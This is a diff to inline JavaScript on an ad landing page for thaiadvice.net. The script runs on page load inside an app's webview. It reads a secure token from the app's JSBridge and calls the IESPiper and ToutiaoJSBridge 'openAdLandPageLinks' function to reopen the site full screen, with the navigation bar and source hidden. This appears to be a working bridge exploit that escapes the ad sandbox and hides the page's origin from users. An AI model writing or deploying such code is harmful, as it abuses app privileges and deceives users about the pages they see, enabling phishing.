@@ -172,61 +172,55 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
 
 (function(){
   var log=window._dbg||function(){};
-  var qs = window.location.search;
-  var CID = 1869709729112081;
-  var TARGET = 'https://thaiadvice.net/page.html';
-  var fsUrl = TARGET + '?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) { log('guard: skip'); return; }
+
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-
-  // STEP 2: loaded via landingStyle:1 — JSBridge available, get token, fire landingStyle:2
-  if (qs.indexOf('s2=1') !== -1) {
-    log('step2: getting token');
-    var tok = null;
-    try { tok = window.JSBridge.getConfig().secure.token; log('token ok'); } catch(e){ log('jsb err: '+e); }
-    if (!tok) { log('no token, bail'); return; }
-
-    // Try IESPiper first (openAdLandPage, confirmed in dataflow)
-    if (wk) {
-      log('s2 IESPiper fire');
-      try {
-        wk.postMessage({
-          __msg_type: 'call', func: 'openAdLandPageLinks', JSSDK: '1.2.5', __callback_id: '1002',
-          params: { url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID, _jsb_secure_token: tok }
-        });
-      } catch(e){ log('ies err: '+e); }
-    }
-
-    // Also try ToutiaoJSBridge in case it has permissions here
-    setTimeout(function(){
-      var tt = window.ToutiaoJSBridge;
-      if (!tt || !tt.call) { log('s2: no ToutiaoJSBridge'); return; }
-      log('s2 ToutiaoJSBridge fire');
-      try {
-        tt.call('openAdLandPageLinks', {
-          url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
-          cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
-          trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: tok
-        }, function(r){ log('s2 tt cb: '+JSON.stringify(r)); });
-      } catch(e){ log('s2 tt err: '+e); }
-    }, 500);
-    return;
-  }
-
-  // STEP 1: initial ad page — open page.html?s2=1 via IESPiper landingStyle:1 (no token needed)
-  if (qs.indexOf('hide_nav_bar=1') !== -1) { log('guard: skip'); return; }
   if (!wk) { log('STOP: no IESPiper'); return; }
 
-  setTimeout(function(){
-    log('step1 fire IESPiper landingStyle:1');
+  var CID = 1869709729112081;
+  var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+
+  // Check if we already have a token (= we're inside a landingStyle:1 context)
+  var tok = null;
+  try { tok = window.JSBridge.getConfig().secure.token; } catch(e){}
+
+  if (tok) {
+    // Step 2: fire landingStyle:2 with token
+    log('have token -> fire landingStyle:2');
     try {
       wk.postMessage({
-        __msg_type: 'call', func: 'openAdLandPageLinks', JSSDK: '1.2.5', __callback_id: '1001',
-        params: { url: TARGET + '?s2=1', landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID }
+        __msg_type: 'call', func: 'openAdLandPageLinks', JSSDK: '1.2.5', __callback_id: '1002',
+        params: { url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID, _jsb_secure_token: tok }
       });
-      log('step1 sent');
-    } catch(e){ log('s1 err: '+e); }
-  }, 1500);
+    } catch(e){ log('s2 err: '+e); }
 
+    // Also try ToutiaoJSBridge
+    setTimeout(function(){
+      var tt = window.ToutiaoJSBridge;
+      if (tt && tt.call) {
+        log('s2 tt fire');
+        try {
+          tt.call('openAdLandPageLinks', {
+            url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+            cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+            trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: tok
+          }, function(r){ log('s2 tt cb: '+JSON.stringify(r)); });
+        } catch(e){ log('s2 tt err: '+e); }
+      }
+    }, 300);
+  } else {
+    // Step 1: no token — open via landingStyle:1 with no URL (opens ad's own page in new context)
+    log('no token -> fire landingStyle:1 (no url)');
+    setTimeout(function(){
+      try {
+        wk.postMessage({
+          __msg_type: 'call', func: 'openAdLandPageLinks', JSSDK: '1.2.5', __callback_id: '1001',
+          params: { landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID }
+        });
+        log('step1 sent');
+      } catch(e){ log('s1 err: '+e); }
+    }, 1500);
+  }
 })();
 </script>
 </body>
